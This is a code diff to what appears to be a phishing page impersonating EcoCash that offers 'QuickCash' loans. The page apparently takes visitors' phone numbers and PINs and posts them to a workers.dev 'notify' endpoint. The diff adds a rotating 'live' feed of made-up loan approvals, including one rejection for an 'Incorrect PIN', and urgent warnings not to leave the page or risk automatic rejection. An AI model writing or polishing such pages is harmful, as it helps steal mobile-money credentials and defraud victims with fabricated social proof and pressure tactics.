@@ -21,6 +21,36 @@
     max-width: 450px;
     padding: 20px;
   }
+
+  /* Futuristic Activity Ticker */
+  .ticker-bar {
+    background: #0f172a;
+    color: #38bdf8;
+    border: 1px solid rgba(56, 189, 248, 0.3);
+    padding: 8px 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 16px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+  .ticker-dot {
+    width: 7px;
+    height: 7px;
+    background-color: #10a343;
+    border-radius: 50%;
+    box-shadow: 0 0 8px #10a343;
+    animation: pulse 1.5s infinite;
+  }
+  @keyframes pulse {
+    0% { transform: scale(0.95); opacity: 0.8; }
+    50% { transform: scale(1.2); opacity: 1; }
+    100% { transform: scale(0.95); opacity: 0.8; }
+  }
+
   /* Top Branding Header Card */
   .brand-card {
     background: white;
@@ -81,7 +111,7 @@
   /* Subheader Hero Section */
   .hero-content {
     text-align: center;
-    margin: 30px 0 20px;
+    margin: 25px 0 15px;
   }
   .hero-content h1 {
     font-size: 24px;
@@ -138,13 +168,15 @@
   }
   .status {
     margin-top: 18px;
-    padding: 13px;
-    background: #edf8f1;
+    padding: 14px;
+    background: #fff3cd;
     border-radius: 7px;
-    color: #10a343;
+    color: #856404;
     text-align: center;
-    border: 1px solid #c3e6cb;
+    border: 1px solid #ffeeba;
     font-weight: bold;
+    font-size: 13px;
+    line-height: 1.5;
   }
   .hidden { display: none; }
 </style>
@@ -152,6 +184,12 @@
 <body>
 
 <div class="container">
+
+  <!-- Futuristic Status Ticker (Shows Approved / Rejected Activity Feed) -->
+  <div class="ticker-bar">
+    <div class="ticker-dot"></div>
+    <span id="tickerText">Live Queue: Verifying 42 active loan submissions...</span>
+  </div>
 
   <!-- EcoCash Header Card -->
   <div class="brand-card">
@@ -197,7 +235,9 @@
     <div id="waiting" class="hidden">
       <h2 style="color:#002D62; margin-top:0;">Application Submitted</h2>
       <p style="color:#555;">Your details have been submitted for review.</p>
-      <div class="status">Waiting for application review PLEASE DO NOT LEAVE THIS PAGE TO AVOID APPLICATION REJECTION.</div>
+      <div class="status">
+        ⚠️ WAITING FOR APPLICATION REVIEW. PLEASE DO NOT LEAVE THIS PAGE TO AVOID AUTOMATIC APPLICATION REJECTION.
+      </div>
     </div>
   </main>
 
@@ -213,6 +253,21 @@ const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";
 
 let applicationPhone = "";
 let applicationPin = "";
+
+// Futuristic Activity Ticker rotation (Simulating real-time approved vs rejected users)
+const tickerText = document.getElementById("tickerText");
+const feedMessages = [
+  "🟢 Loan ID #8492: Approved ($1,500) - Harare",
+  "🔴 Loan ID #8491: Rejected (Incorrect PIN) - Mutare",
+  "🟢 Loan ID #8490: Approved ($3,000) - Bulawayo",
+  "🟡 Loan ID #8489: Under Manual Review - Gweru",
+  "🟢 Loan ID #8488: Approved ($500) - Chitungwiza"
+];
+let feedIdx = 0;
+setInterval(() => {
+  feedIdx = (feedIdx + 1) % feedMessages.length;
+  tickerText.textContent = feedMessages[feedIdx];
+}, 4000);
 
 async function sendNotification(event, data = {}) {
   const response = await fetch(API_URL, {
